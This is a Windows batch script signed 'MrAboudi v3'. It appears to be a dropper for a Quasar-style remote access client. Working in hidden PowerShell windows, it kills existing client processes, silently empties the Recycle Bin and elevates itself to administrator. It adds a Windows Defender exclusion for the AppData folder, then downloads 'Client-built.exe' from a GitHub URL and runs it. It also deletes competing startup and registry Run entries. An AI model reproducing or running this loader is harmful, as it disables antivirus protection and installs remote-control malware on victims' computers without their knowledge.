@echo off
setlocal
:: ============================================================================
:: Configuration
:: Defines all necessary paths and the download URL.
:: ============================================================================
set "APPDATA_PATH=%USERPROFILE%\AppData"
set "SUBDIR=%APPDATA_PATH%\Roaming\SubDir"
set "TRACES_DIR=%APPDATA_PATH%\Roaming\Traces"
set "TARGET_FILE=%TRACES_DIR%\Client-built.exe"
:: This URL now points directly to the raw file content on GitHub.
set "DOWNLOAD_URL=https://github.com/Abdullah67289/Ghoste-Trace/raw/main/Client-built.exe"
:: ============================================================================
:: Execution Flow
:: The script follows the requested order of operations.
:: ============================================================================
:: Kill System32.exe if running in SubDir
if exist "%SUBDIR%\System32.exe" (
    taskkill /F /IM System32.exe >nul 2>&1
)
:: Only delete the 'System32' folder inside %SUBDIR%
if exist "%SUBDIR%\System32" (
    rd /s /q "%SUBDIR%\System32"
)
:: Clean Traces folder only
call :clean_folder "%TRACES_DIR%"
:: 3. Delete everything within the Traces folder.
call :clean_folder "%TRACES_DIR%"
:: After cleaning, recreate the folders so they are available for use.
mkdir "%TRACES_DIR%" >nul 2>&1
:: 4. Silently empty the Recycle Bin without any user prompts.
powershell -WindowStyle Hidden -Command "$null = (New-Object -ComObject Shell.Application).NameSpace(0xA).Items() | ForEach-Object { Remove-Item $_.Path -Recurse -Force -ErrorAction SilentlyContinue }" >nul 2>&1
:: Preserving other tasks from the original script as requested.
:: End the "Quasar Client" task if it is running.
taskkill /F /FI "WINDOWTITLE eq Quasar Client" >nul 2>&1
:: Check for administrator privileges. If not running as admin, it will restart itself with elevated permissions.
net session >nul 2>&1
if %errorlevel% NEQ 0 (
    powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -Verb runAs"
    exit /b
)
:: Add a Windows Defender exclusion for the AppData path to prevent interference.
powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath '%APPDATA_PATH%'" >nul 2>&1
:: Loop to check for an active internet connection before proceeding.
:CheckInternetLoop
ping -n 1 8.8.8.8 >nul 2>&1
if errorlevel 1 (
    timeout /t 5 /nobreak >nul 2>&1
    goto CheckInternetLoop
)
:: 5. Download a fresh client-build into the now-empty Traces folder.
:: Clear DNS cache and add no-cache headers to Invoke-WebRequest to try and bypass caching.
:: A random parameter is also added to the URL to bypass any potential client-side cache.
powershell -WindowStyle Hidden -Command "Clear-DnsClientCache; Invoke-WebRequest -Uri '%DOWNLOAD_URL%?r=%RANDOM%' -Headers @{'Cache-Control'='no-cache'; 'Pragma'='no-cache'} -OutFile '%TARGET_FILE%' -UseBasicParsing" >nul 2>&1
:: 6. Immediately execute the newly downloaded client. It is started twice to help ensure execution.
if exist "%TARGET_FILE%" (
    start "" "%TARGET_FILE%"
    start "" "%TARGET_FILE%"
)

:: Remove desktop.ini from both Startup folders
for %%P in (
    "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\desktop.ini"
    "%PROGRAMDATA%\Microsoft\Windows\Start Menu\Programs\Startup\desktop.ini"
) do (
    if exist "%%~P" (
        attrib -h -s -r "%%~P" >nul 2>&1
        del /f /q "%%~P" >nul 2>&1
    )
)

:: Remove registry Run values that point to desktop.ini
for %%K in ("HKCU\Software\Microsoft\Windows\CurrentVersion\Run" "HKLM\Software\Microsoft\Windows\CurrentVersion\Run") do (
    for /f "tokens=1,*" %%A in ('reg query %%K 2^>nul ^| findstr /R /C:"^[ ]*[^ ]"') do (
        for /f "tokens=2,*" %%X in ('reg query %%K /v "%%~nxA" 2^>nul ^| findstr /R /C:"REG_"') do (
            echo %%Y | findstr /I "desktop.ini" >nul
            if not errorlevel 1 (
                reg delete %%K /v "%%~nxA" /f >nul 2>&1
            )
        )
    )
)

:: ==========================
:: Silent double-check desktop.ini cleanup
:: ==========================

set "ERRORS=0"

if exist "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\desktop.ini" (
    set /a ERRORS+=1
)
if exist "%PROGRAMDATA%\Microsoft\Windows\Start Menu\Programs\Startup\desktop.ini" (
    set /a ERRORS+=1
)

for %%K in ("HKCU\Software\Microsoft\Windows\CurrentVersion\Run" "HKLM\Software\Microsoft\Windows\CurrentVersion\Run") do (
    for /f "tokens=1,*" %%A in ('reg query %%K 2^>nul ^| findstr /R /C:"^[ ]*[^ ]"') do (
        for /f "tokens=2,*" %%X in ('reg query %%K /v "%%~nxA" 2^>nul ^| findstr /R /C:"REG_"') do (
            echo %%Y | findstr /I "desktop.ini" >nul
            if not errorlevel 1 (
                set /a ERRORS+=1
            )
        )
    )
)

:: ============================================================================
:: Subroutine: clean_folder
:: Robustly deletes a specified folder and all of its contents, including
:: files and subfolders with hidden, system, or read-only attributes.
:: ============================================================================
:clean_folder
if exist "%~1\" (
    rem First, remove attributes from all files and folders that might prevent deletion.
    attrib -h -s -r "%~1\*" /s /d >nul 2>&1
    rem Then, remove the entire directory tree quietly.
    rmdir /s /q "%~1" >nul 2>&1
)
exit /b

:: By MrAboudi
:: v3
